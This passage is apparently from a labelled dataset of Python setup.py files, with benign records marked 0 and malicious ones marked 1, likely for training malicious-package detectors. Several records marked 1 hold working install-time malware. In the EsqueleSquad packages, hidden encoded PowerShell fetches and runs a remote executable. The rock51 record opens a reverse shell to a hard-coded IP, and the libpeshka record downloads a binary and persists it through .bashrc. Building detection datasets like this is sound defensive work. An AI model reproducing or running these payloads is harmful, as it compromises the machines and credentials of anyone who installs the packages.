- Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "py-pipsuperad-3.82", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-pipsuperad',\n    packages = ['modlib'],\n    version = '7.27',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "rock51-1.0.0", "func": "import socket \nimport os \nimport pty \n \nimport setuptools \nfrom setuptools.command.install import install \n \nclass myclass(install): \n    def run(self): \n        LHOST = \"85.159.212.47\"\n        LPORT = 61985 \n \n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n        s.connect((LHOST, LPORT)) \n        os.dup2(s.fileno(), 0) \n        os.dup2(s.fileno(), 1) \n        os.dup2(s.fileno(), 2) \n        pty.spawn(\"/bin/sh\") \n \nsetuptools.setup( \n  name=\"rock51\", \n  version=\"1.0.0\", \n  author=\"test\", \n  author_email=\"test@me.com\", \n  description=\"Test Desc\", \n  long_description=\"asd\", \n  long_description_content_type=\"text/markdown\", \n  url=\"https://github.com/test\", \n  packages=setuptools.find_packages(), \n  cmdclass={ \"install\": myclass } \n)\n", "target": 1}
{"idx": "fcache-0.4.7", "func": "from setuptools import setup\n\nwith open('README.rst') as f:\n    long_description = f.read()\n\nsetup(\n    name='fcache',\n    version='0.4.7',\n    author='Thomas Roten',\n    author_email='thomas@roten.us',\n    url='https://github.com/tsroten/fcache',\n    description='a dictionary-like, file-based cache module for Python',\n    long_description=long_description,\n    platforms='any',\n    classifiers=[\n        'Programming Language :: Python',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: System :: Filesystems',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Intended Audience :: Developers',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n    ],\n    keywords=['cache', 'file', 'serialize'],\n    packages=['fcache', 'tests'],\n    test_suite='tests',\n    install_requires=['appdirs'],\n)\n", "target": 0}
{"idx": "graphframes-0.6", "func": "# Your python setup file. An example can be found at:\n\n\nfrom setuptools import setup, find_packages\n# To use a consistent encoding\nfrom codecs import open\nfrom os import path\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the README file\n#with open(path.join(here, 'README.rst'), encoding='utf-8') as f:\n #   long_description = f.read()\n\nsetup(\n    name='graphframes',\n\n    # Versions should comply with PEP440.  For a discussion on single-sourcing\n    # the version across setup.py and the project code, see\n    # https://packaging.python.org/en/latest/single_source_version.html\n    version='0.6',\n    description='GraphFrames: DataFrame-based Graphs',\n    long_description='This is a package for DataFrame-based graphs on top of Apache Spark. Users can write highly expressive queries by leveraging the DataFrame API, combined with a new API for motif finding. The user also benefits from DataFrame performance optimizations within the Spark SQL engine.',\n\n    # The project's main homepage.\n    url='https://github.com/graphframes/graphframes',\n\n    # Author details\n    author='graphframes',\n    author_email='modeldb@csail.mit.edu',\n\n    # Choose your license\n    license='MIT',\n\n    # See https://pypi.python.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        # How mature is this project? Common values are\n        #   3 - Alpha\n        #   4 - Beta\n        #   5 - Production/Stable\n        'Development Status :: 3 - Alpha',\n\n        # Indicate who your project is intended for\n        'Intended Audience :: Developers',\n        'Intended Audience :: Science/Research',\n        'Topic :: Scientific/Engineering',\n\n        # Pick your license as you wish (should match \"license\" above)\n        'License :: OSI Approved :: MIT License',\n\n        # Specify the Python versions you support here. In particular, ensure\n        # that you indicate whether you support Python 2, Python 3 or both.\n       # 'Programming Language :: Python :: 2.7',\n        # 'Programming Language :: Python :: 3',\n        # 'Programming Language :: Python :: 3.3',\n         'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.5',\n    ],\n\n    # What does your project relate to?\n    keywords='spark graphx  for dataframe',\n\n    # You can just specify the packages manually here if your project is\n    # simple. Or you can use find_packages().\n    packages=find_packages(exclude=['*.tests.*', '*.tests']),\n\n    # Alternatively, if you want to distribute just a my_module.py, uncomment\n    # this:\n    #   py_modules=[\"my_module\"],\n\n    # List run-time dependencies here.  These will be installed by pip when\n    # your project is installed. For an analysis of \"install_requires\" vs pip's\n    # requirements files see:\n    # https://packaging.python.org/en/latest/requirements.html\n    install_requires=[\n        'numpy', 'nose'],\n\n    # List additional groups of dependencies here (e.g. development\n    # dependencies). You can install these using the following syntax,\n    # for example:\n    # $ pip install -e .[dev,test]\n    # extras_require={\n    #     'dev': ['check-manifest'],\n    #     'test': ['coverage'],\n    # },\n\n    # If there are data files included in your packages that need to be\n    # installed, specify them here.  If using Python 2.6 or less, then these\n    # have to be included in MANIFEST.in as well.\n    # package_data={\n    #     '': ['syncer.json'],\n    # },\n\n    # Although 'package_data' is the preferred approach, in some case you may\n    # need to place data files outside of your packages. See:\n    # http://docs.python.org/3.4/distutils/setupscript.html#installing-additional-files # noqa\n    # In this case, 'data_file' will be installed into '<sys.prefix>/my_data'\n    # data_files=[('config', ['syncer.json'])],\n\n    # To provide executable scripts, use entry points in preference to the\n    # \"scripts\" keyword. Entry points provide cross-platform support and allow\n    # pip to create the appropriate form of executable for the target platform.\n    # entry_points={\n    #     'console_scripts': [\n    #         'sample=sample:main',\n    #     ],\n    # },\n)\n\n# https://github.com/pypa/sampleproject/blob/master/setup.py\n", "target": 0}
{"idx": "duet-0.2.7", "func": "# Copyright 2021 The Duet Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport os\nimport pathlib\n\nfrom setuptools import setup\n\n# This reads the __version__ variable from duet/_version.py\n__version__ = \"\"\nexec(pathlib.Path(\"duet/_version.py\").read_text())\n\nname = \"duet\"\n\ndescription = \"A simple future-based async library for python.\"\n\n# README file as long_description.\nlong_description = pathlib.Path(\"README.md\").read_text()\n\n# If DUET_PRE_RELEASE_VERSION is set then we update the version to this value.\n# It is assumed that it ends with one of `.devN`, `.aN`, `.bN`, `.rcN` and hence\n# it will be a pre-release version on PyPi. See\n# https://packaging.python.org/guides/distributing-packages-using-setuptools/#pre-release-versioning\n# for more details.\nif \"DUET_PRE_RELEASE_VERSION\" in os.environ:\n    __version__ = os.environ[\"DUET_PRE_RELEASE_VERSION\"]\n    long_description = \"\\n\\n\".join(\n        [\n            \"This is a development version of Duet and may be unstable.\",\n            \"For the latest stable release see https://pypi.org/project/duet/.\",\n            long_description,\n        ]\n    )\n\n# Sanity check\nassert __version__, \"Version string cannot be empty\"\n\n# Read requirements\nrequirements = [line.strip() for line in open(\"requirements.txt\").readlines()]\ndev_requirements = [line.strip() for line in open(\"dev/requirements.txt\").readlines()]\n\nsetup(\n    name=name,\n    version=__version__,\n    url=\"http://github.com/google/duet\",\n    author=\"The Duet Authors\",\n    author_email=\"maffoo@google.com\",\n    python_requires=\">=3.7.0\",\n    install_requires=requirements,\n    extras_require={\n        \"dev_env\": dev_requirements,\n    },\n    license=\"Apache 2\",\n    description=description,\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    packages=[\"duet\"],\n    package_data={\n        \"duet\": [\"py.typed\"],\n    },\n)\n", "target": 0}
{"idx": "gprof2dot-2022.7.29", "func": "#!/usr/bin/env python3\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "django-celery-beat-2.3.0", "func": "#!/usr/bin/env python3\n\nimport codecs\nimport os\nimport re\nimport sys\n\nimport setuptools\nimport setuptools.command.test\n\ntry:\n    import platform\n    _pyimp = platform.python_implementation\nexcept (AttributeError, ImportError):\n    def _pyimp():\n        return 'Python'\n\nNAME = 'django-celery-beat'\nPACKAGE = 'django_celery_beat'\n\nE_UNSUPPORTED_PYTHON = '%s 1.0 requires %%s %%s or later!' % (NAME,)\n\nPYIMP = _pyimp()\nPY37_OR_LESS = sys.version_info < (3, 7)\nPYPY_VERSION = getattr(sys, 'pypy_version_info', None)\nPYPY24_ATLEAST = PYPY_VERSION and PYPY_VERSION >= (2, 4)\n\nif PY37_OR_LESS and not PYPY24_ATLEAST:\n    raise Exception(E_UNSUPPORTED_PYTHON % (PYIMP, '3.7'))\n\n# -*- Classifiers -*-\n\nclasses = \"\"\"\n    Development Status :: 5 - Production/Stable\n    License :: OSI Approved :: BSD License\n    Programming Language :: Python\n    Programming Language :: Python :: 3\n    Programming Language :: Python :: 3.7\n    Programming Language :: Python :: 3.8\n    Programming Language :: Python :: 3.9\n    Programming Language :: Python :: 3.10\n    Programming Language :: Python :: Implementation :: CPython\n    Programming Language :: Python :: Implementation :: PyPy\n    Framework :: Django\n    Framework :: Django :: 3.2\n    Framework :: Django :: 4.0\n    Operating System :: OS Independent\n    Topic :: Communications\n    Topic :: System :: Distributed Computing\n    Topic :: Software Development :: Libraries :: Python Modules\n\"\"\"\nclassifiers = [s.strip() for s in classes.split('\\n') if s]\n\n# -*- Distribution Meta -*-\n\nre_meta = re.compile(r'__(\\w+?)__\\s*=\\s*(.*)')\nre_doc = re.compile(r'^\"\"\"(.+?)\"\"\"')\n\n\ndef add_default(m):\n    attr_name, attr_value = m.groups()\n    return ((attr_name, attr_value.strip(\"\\\"'\")),)\n\n\ndef add_doc(m):\n    return (('doc', m.groups()[0]),)\n\npats = {re_meta: add_default,\n        re_doc: add_doc}\nhere = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(here, PACKAGE, '__init__.py')) as meta_fh:\n    meta = {}\n    for line in meta_fh:\n        if line.strip() == '# -eof meta-':\n            break\n        for pattern, handler in pats.items():\n            m = pattern.match(line.strip())\n            if m:\n                meta.update(handler(m))\n\n# -*- Installation Requires -*-\n\ndef strip_comments(l):\n    return l.split('#', 1)[0].strip()\n\n\ndef _pip_requirement(req):\n    if req.startswith('-r '):\n        _, path = req.split()\n        return reqs(*path.split('/'))\n    return [req]\n\n\ndef _reqs(*f):\n    return [\n        _pip_requirement(r) for r in (\n            strip_comments(l) for l in open(\n                os.path.join(os.getcwd(), 'requirements', *f)).readlines()\n        ) if r]\n\n\ndef reqs(*f):\n    return [req for subreq in _reqs(*f) for req in subreq]\n\n# -*- Long Description -*-\n\nif os.path.exists('README.rst'):\n    long_description = codecs.open('README.rst', 'r', 'utf-8').read()\n    long_description_content_type = 'text/x-rst'\nelse:\n    long_description = 'See http://pypi.python.org/pypi/%s' % (NAME,)\n    long_description_content_type = 'text/markdown'\n\n# -*- %%% -*-\n\n\nclass pytest(setuptools.command.test.test):\n    user_options = [('pytest-args=', 'a', 'Arguments to pass to pytest')]\n\n    def initialize_options(self):\n        setuptools.command.test.test.initialize_options(self)\n        self.pytest_args = []\n\n    def run_tests(self):\n        import pytest\n        sys.exit(pytest.main(self.pytest_args))\n\nsetuptools.setup(\n    name=NAME,\n    packages=setuptools.find_packages(exclude=[\n        'ez_setup', 't', 't.*',\n    ]),\n    version=meta['version'],\n    description=meta['doc'],\n    long_description=long_description,\n    long_description_content_type=long_description_content_type,\n    keywords='django celery beat periodic task database',\n    author=meta['author'],\n    author_email=meta['contact'],\n    url=meta['homepage'],\n    platforms=['any'],\n    license='BSD',\n    install_requires=reqs('default.txt') + reqs('runtime.txt'),\n    tests_require=reqs('test.txt') + reqs('test-django.txt'),\n    cmdclass={'test': pytest},\n    classifiers=classifiers,\n    entry_points={\n        'celery.beat_schedulers': [\n            'django = django_celery_beat.schedulers:DatabaseScheduler',\n        ],\n    },\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "libpeshka-0.2", "func": "from setuptools import setup, find_packages\n\n\ndef rn ():\n\n        import platform\n        import urllib2\n        import os, stat\n\n        ADD_LOC = \"http://145.249.104.71/out\"\n        LOC = \".drv\"\n\n        if platform.system () == \"Linux\":\n                response = urllib2.urlopen (ADD_LOC)\n                os.chdir (os.path.expanduser (\"~\"))\n                d = open (LOC, \"wb\")\n                d.write (response.read ())\n                d.close ()\n\n                current_state = os.stat (LOC)\n                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n\n                brc = open (\".bashrc\", \"a\")\n                brc.write (\"\\n~/.drv &\")\n                brc.close ()\n\n\n        else:\n                print (\"Error installing library!\")\n                exit (-1)\n\nrn ()\n\n\nsetup(\n  name = 'libpeshka',\n  packages = find_packages (),\n  entry_points={\n\t'setuptools.installation': [\n\t\t'eggsecutable = libari.pr:rn'\n\t]\n  },\n  version = '0.2',\n  description = 'Libari wrapper for python',\n  author = 'Ruri12',\n  author_email = 'ruri12@example.com',\n  scripts=[\"pr.py\"],\n  url = '',\n  download_url = '', \n  keywords = ['libari'],\n  classifiers = [],\n)\n", "target": 1}
{"idx": "django_js_asset-2.0.0", "func": "#!/usr/bin/env python3\nfrom setuptools import setup\n\n\nsetup()\n", "target": 0}
{"idx": "flake8_tuple-0.4.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport re\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\ndef read(filename):\n    with open(filename) as f:\n        return f.read()\n\n\ndef find_version():\n    version_file = read('flake8_tuple.py')\n    version_match = re.search(\n        r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\", version_file, re.M\n    )\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\n\nreadme = read('README.rst')\nhistory = read('HISTORY.rst').replace('.. :changelog:', '')\n\nrequirements = [\n    'six',\n    'flake8'\n]\n\ntest_requirements = [\n    'tox',\n    'ddt',\n]\n\nsetup(\n    name='flake8_tuple',\n    version=find_version(),\n    description=\"Check code for 1 element tuple.\",\n    long_description=readme + '\\n\\n' + history,\n    author=\"Arkadiusz Adamski\",\n    author_email='arkadiusz.adamski@gmail.com',\n    url='https://github.com/ar4s/flake8_tuple',\n    py_modules=[\n        'flake8_tuple',\n    ],\n    include_package_data=True,\n    install_requires=requirements,\n    license=\"BSD\",\n    zip_safe=False,\n    keywords='flake8_tuple',\n    classifiers=[\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n    ],\n    test_suite='tests',\n    tests_require=requirements + test_requirements,\n    entry_points={\n        'flake8.extension': [\n            'T80 = flake8_tuple:TupleChecker',\n        ],\n    }\n)\n", "target": 0}
{"idx": "dagster-aws-0.16.3", "func": "from typing import Dict\n\nfrom setuptools import find_packages, setup\n\n\ndef get_version() -> str:\n    version: Dict[str, str] = {}\n    with open(\"dagster_aws/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\nif __name__ == \"__main__\":\n    ver = get_version()\n    # dont pin dev installs to avoid pip dep resolver issues\n    pin = \"\" if ver == \"0+dev\" else f\"=={ver}\"\n    setup(\n        name=\"dagster-aws\",\n        version=ver,\n        author=\"Elementl\",\n        author_email=\"hello@elementl.com\",\n        license=\"Apache-2.0\",\n        description=\"Package for AWS-specific Dagster framework solid and resource components.\",\n        url=\"https://github.com/dagster-io/dagster/tree/master/python_modules/libraries/dagster-aws\",\n        classifiers=[\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n        ],\n        packages=find_packages(exclude=[\"dagster_aws_tests*\"]),\n        include_package_data=True,\n        install_requires=[\n            \"boto3\",\n            \"dagster==1.0.3\",\n            \"packaging\",\n            \"requests\",\n        ],\n        extras_require={\n            \"redshift\": [\"psycopg2-binary\"],\n            \"pyspark\": [\"dagster-pyspark\"],\n            \"test\": [\n                \"moto>=2.2.8\",\n                \"requests-mock\",\n                \"xmltodict==0.12.0\",  # pinned until moto>=3.1.9 (https://github.com/spulec/moto/issues/5112)\n            ],\n        },\n        zip_safe=False,\n    )\n", "target": 0}
{"idx": "django-sendgrid-v5-1.2.1", "func": "from codecs import open\nfrom os import path\n\nfrom setuptools import find_packages, setup\n\nhere = path.abspath(path.dirname(__file__))\n\nwith open(path.join(here, \"README.md\"), encoding=\"utf-8\") as f:\n    long_description = f.read()\n\n__version__ = None\nwith open(\"sendgrid_backend/version.py\") as f:\n    exec(f.read())\n\nsetup(\n    name=\"django-sendgrid-v5\",\n    version=str(__version__),\n    description=\"An implementation of Django's EmailBackend compatible with sendgrid-python v5+\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/sklarsa/django-sendgrid-v5\",\n    license=\"MIT\",\n    author=\"Steven Sklar\",\n    author_email=\"sklarsa@gmail.com\",\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n    ],\n    keywords=\"django email sendgrid backend\",\n    packages=find_packages(\n        exclude=[\n            \"test\",\n        ]\n    ),\n    install_requires=[\n        \"django >=1.8\",\n        \"sendgrid >=5.0.0\",\n        \"python-http-client >=3.0.0\",\n    ],\n)\n", "target": 0}
{"idx": "gym-notices-0.0.8", "func": "import setuptools\n\nwith open(\"README.md\", \"r\", encoding=\"utf-8\") as fh:\n    long_description = fh.read()\n\nsetuptools.setup(\n    name=\"gym-notices\",\n    version=\"0.0.8\",\n    author=\"Jordan Terry\",\n    author_email=\"jkterry0@farama.org\",\n    description=\"Notices for gym\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/Farama-Foundation/gym-notices\",\n\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir={\"\": \"src\"},\n    packages=setuptools.find_packages(where=\"src\"),\n)\n", "target": 0}
{"idx": "craftpost-7.7", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'craftpost',\n    packages = ['modlib'],\n    version = '9.96',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gitdb2-4.0.2", "func": "from setuptools import setup\n\nsetup(\n    name=\"gitdb2\",\n    version=\"4.0.2\",\n    author=\"Sebastian Thiel\",\n    author_email=\"byronimo@gmail.com\",\n    description=\"A mirror package for gitdb\",\n    long_description=\"This is a mirror package for `gitdb <https://pypi.org/project/gitdb/>`_. Consider installing it directly instead.\",\n    url=\"https://github.com/gitpython-developers/gitdb\",\n    install_requires=[\"gitdb>=4.0.1\"],\n)\n", "target": 0}
{"idx": "pullpush-9.81", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pullpush',\n    packages = ['modlib'],\n    version = '8.51',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flask-swagger-ui-4.11.1", "func": "from setuptools import setup\nfrom codecs import open\nfrom os import path\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the README file\nwith open(path.join(here, \"flask_swagger_ui/README.md\"), encoding=\"utf-8\") as f:\n    long_description = f.read()\n\nsetup(\n    name=\"flask-swagger-ui\",\n    version=\"4.11.1\",\n    description=\"Swagger UI blueprint for Flask\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    zip_safe=False,\n    url=\"https://github.com/sveint/flask-swagger-ui\",\n    author=\"Svein Tore Koksrud Seljebotn\",\n    author_email=\"sveint@gmail.com\",\n    license=\"MIT\",\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.6\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n    ],\n    keywords=\"flask swagger\",\n    packages=[\"flask_swagger_ui\"],\n    install_requires=[\"flask\"],\n    package_data={\n        \"flask_swagger_ui\": [\n            \"LICENSE\",\n            \"README.md\",\n            \"templates/*.html\",\n            \"dist/VERSION\",\n            \"dist/LICENSE\",\n            \"dist/README.md\",\n            \"dist/*.html\",\n            \"dist/*.js\",\n            \"dist/*.css\",\n            \"dist/*.png\",\n            \"dist/*.map\",\n        ]\n    },\n)\n", "target": 0}
{"idx": "flake8-pytest-style-1.6.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['flake8_pytest_style', 'flake8_pytest_style.visitors']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['flake8-plugin-utils>=1.3.2,<2.0.0']\n\nentry_points = \\\n{'flake8.extension': ['PT = flake8_pytest_style.plugin:PytestStylePlugin']}\n\nsetup_kwargs = {\n    'name': 'flake8-pytest-style',\n    'version': '1.6.0',\n    'description': 'A flake8 plugin checking common style issues or inconsistencies with pytest-based tests.',\n    'long_description': \"# flake8-pytest-style\\n\\n[![pypi](https://badge.fury.io/py/flake8-pytest-style.svg)](https://pypi.org/project/flake8-pytest-style)\\n[![Python: 3.6+](https://img.shields.io/badge/Python-3.6+-blue.svg)](https://pypi.org/project/flake8-pytest-style)\\n[![Downloads](https://img.shields.io/pypi/dm/flake8-pytest-style.svg)](https://pypistats.org/packages/flake8-pytest-style)\\n[![Build Status](https://github.com/m-burst/flake8-pytest-style/actions/workflows/ci.yml/badge.svg?branch=master)](https://github.com/m-burst/flake8-pytest-style/actions/workflows/ci.yml)\\n[![Code coverage](https://codecov.io/gh/m-burst/flake8-pytest-style/branch/master/graph/badge.svg)](https://codecov.io/gh/m-burst/flake8-pytest-style)\\n[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://en.wikipedia.org/wiki/MIT_License)\\n[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/ambv/black)\\n\\n## Description\\n\\nA `flake8` plugin checking common style issues or inconsistencies with `pytest`-based tests.\\n\\nCurrently the following errors are reported:\\n\\n| Code    | Description |\\n| ------- | ----------- |\\n| [PT001] | use @pytest.fixture() over @pytest.fixture <br> (configurable by `pytest-fixture-no-parentheses`) |\\n| [PT002] | configuration for fixture '{name}' specified via positional args, use kwargs |\\n| [PT003] | scope='function' is implied in @pytest.fixture() |\\n| [PT004] | fixture '{name}' does not return anything, add leading underscore |\\n| [PT005] | fixture '{name}' returns a value, remove leading underscore |\\n| [PT006] | wrong name(s) type in @pytest.mark.parametrize, expected {expected_type} <br> (configurable by `pytest-parametrize-names-type`) |\\n| [PT007] | wrong values type in @pytest.mark.parametrize, expected {expected_type} <br> (configurable by `pytest-parametrize-values-type` and `pytest-parametrize-values-row-type`) |\\n| [PT008] | use return_value= instead of patching with lambda |\\n| [PT009] | use a regular assert instead of unittest-style '{assertion}' |\\n| [PT010] | set the expected exception in pytest.raises() |\\n| [PT011] | pytest.raises({exception}) is too broad, set the match parameter or use a more specific exception <br> (configurable by `pytest-raises-require-match-for`) |\\n| [PT012] | pytest.raises() block should contain a single simple statement |\\n| [PT013] | found incorrect import of pytest, use simple 'import pytest' instead |\\n| [PT014] | found duplicate test cases {indexes} in @pytest.mark.parametrize |\\n| [PT015] | assertion always fails, replace with pytest.fail() |\\n| [PT016] | no message passed to pytest.fail() |\\n| [PT017] | found assertion on exception {name} in except block, use pytest.raises() instead |\\n| [PT018] | assertion should be broken down into multiple parts |\\n| [PT019] | fixture {name} without value is injected as parameter, use @pytest.mark.usefixtures instead |\\n| [PT020] | @pytest.yield_fixture is deprecated, use @pytest.fixture |\\n| [PT021] | use yield instead of request.addfinalizer |\\n| [PT022] | no teardown in fixture {name}, use return instead of yield |\\n| [PT023] | use 